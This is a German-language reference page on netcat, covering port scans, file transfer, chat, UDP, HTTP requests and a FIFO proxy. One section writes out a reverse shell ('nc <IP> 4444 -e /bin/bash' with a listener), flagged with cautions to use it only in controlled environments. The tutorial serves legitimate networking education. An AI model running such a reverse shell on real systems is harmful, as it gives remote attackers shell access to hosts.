---
title: Netcat
layout: default
nav_order: 6
---

#### Table of Contents
{: .no_toc .text-delta }

- 1
- 2
- 3
{:toc}

<script type="text/javascript">
$('#toc').toc({ headers: 'h1, h2, h3' });
</script>

# Netcat

Netcat ist ein vielseitiges Tool zur Arbeit mit TCP- und UDP-Verbindungen. Es wird oft als "Schweizer Taschenmesser" für Netzwerke bezeichnet und eignet sich für Port-Scans, Datenübertragung, Debugging und einfache Server/Client-Kommunikation.

[Netcat Manpage](https://man7.org/linux/man-pages/man1/nc.1.html)

#### **Grundlegende Syntax**
```
nc [Optionen] <Ziel> <Port>
```

---

### **Häufig verwendete Optionen**

- **`-l`** → Lauscht auf eingehenden Verbindungen (Listen-Modus).  
- **`-p`** → Gibt den Port an, auf dem Netcat lauschen soll.  
- **`-u`** → Nutzt UDP anstelle von TCP.  
- **`-v`** → Zeigt detaillierte Verbindungsinformationen an (verbose).  
- **`-z`** → "Zero-I/O"-Modus, häufig für Port-Scans verwendet.  
- **`-w <Sekunden>`** → Timeout für Verbindungen festlegen.  
- **`-e <Programm>`** → Führt ein Programm aus, wenn eine Verbindung hergestellt wird (z. B. Shell). **(Achtung: Kann von Angreifern ausgenutzt werden.)**

---

### **Anwendungsfälle**

#### **1. Port-Scan**
```bash
nc -zv <IP-Adresse> <Port-Bereich>
```
Beispiel:
```bash
nc -zv 192.168.1.1 20-80
```
- **`-z`** → Sendet keine Daten, prüft nur, ob der Port offen ist.
- **`-v`** → Gibt detaillierte Ergebnisse aus.

#### **2. Einfache Verbindung zu einem Server**
```bash
nc <IP-Adresse> <Port>
```
Beispiel:
```bash
nc 192.168.1.1 80
```
- Baut eine Verbindung zu einem HTTP-Server auf. Eingabe von HTTP-Befehlen wie `GET /` möglich.

#### **3. Lokalen TCP-Server starten**
```bash
nc -l -p <Port>
```
Beispiel:
```bash
nc -l -p 1234
```
- Lauscht auf Port 1234 für eingehende Verbindungen.

#### **4. Dateiübertragung**
- **Datei senden:**
  ```bash
  nc <Ziel-IP> <Port> < datei.txt
  ```
- **Datei empfangen:**
  ```bash
  nc -l -p <Port> > empfangene_datei.txt
  ```

Beispiel:
- Auf Server (empfangen):
  ```bash
  nc -l -p 1234 > empfangene_datei.txt
  ```
- Auf Client (senden):
  ```bash
  nc 192.168.1.1 1234 < datei.txt
  ```

#### **5. Chat-Verbindung**
- **Server:**
  ```bash
  nc -l -p <Port>
  ```
- **Client:**
  ```bash
  nc <Ziel-IP> <Port>
  ```
Beispiel:
- Server:
  ```bash
  nc -l -p 1234
  ```
- Client:
  ```bash
  nc 192.168.1.1 1234
  ```

#### **6. Reverse Shell (Vorsicht!)**
- **Auf Server lauschen:**
  ```bash
  nc -l -p <Port>
  ```
- **Shell senden (auf Ziel):**
  ```bash
  nc <Ziel-IP> <Port> -e /bin/bash
  ```
Beispiel:
- Server:
  ```bash
  nc -l -p 4444
  ```
- Client:
  ```bash
  nc 192.168.1.1 4444 -e /bin/bash
  ```

**Achtung:** Reverse Shells können ein großes Sicherheitsrisiko darstellen. Nutzung nur in sicheren und kontrollierten Umgebungen.

---

### **Erweiterte Nutzung**

#### **1. UDP-Server und Client**
- **UDP-Server starten:**
  ```bash
  nc -u -l -p <Port>
  ```
- **UDP-Client verbinden:**
  ```bash
  nc -u <Ziel-IP> <Port>
  ```

#### **2. HTTP-Anfragen senden**
```bash
echo -e "GET / HTTP/1.1\r\nHost: example.com\r\n\r\n" | nc <IP-Adresse> 80
```
Beispiel:
```bash
echo -e "GET / HTTP/1.1\r\nHost: example.com\r\n\r\n" | nc 93.184.216.34 80
```

#### **3. Verbindung mit Timeout**
```bash
nc -w <Sekunden> <Ziel-IP> <Port>
```
Beispiel:
```bash
nc -w 5 192.168.1.1 80
```
- Beendet die Verbindung, wenn nach 5 Sekunden keine Antwort erfolgt.

#### **4. Proxy-Datenverkehr analysieren**
Netcat kann genutzt werden, um zwischen zwei Hosts als Proxy zu fungieren:
```bash
mkfifo /tmp/proxy
nc -l -p 8080 < /tmp/proxy | nc <Ziel-IP> 80 > /tmp/proxy
```

---

### **Fehlerbehebung und Tipps**

- **Problem:** Verbindung schlägt fehl.  
  **Lösung:** Prüfe Firewall-Einstellungen und stelle sicher, dass der Port auf beiden Seiten offen ist.

- **Problem:** Keine Ausgabe bei `-zv`.  
  **Lösung:** Teste explizit mit verschiedenen Protokollen (`-u` für UDP oder ohne `-u` für TCP).

- **Problem:** Datenübertragung zu langsam.  
  **Lösung:** Nutze spezialisierte Tools wie SCP oder rsync für große Dateien.

---

### **Sicherheitswarnung**

Netcat kann bei unsachgemäßer Verwendung Sicherheitsrisiken darstellen, insbesondere durch die Nutzung der Option `-e` (Remote Execution). Stelle sicher, dass das Tool nur in vertrauenswürdigen Umgebungen und mit ausreichender Zugriffskontrolle eingesetzt wird.
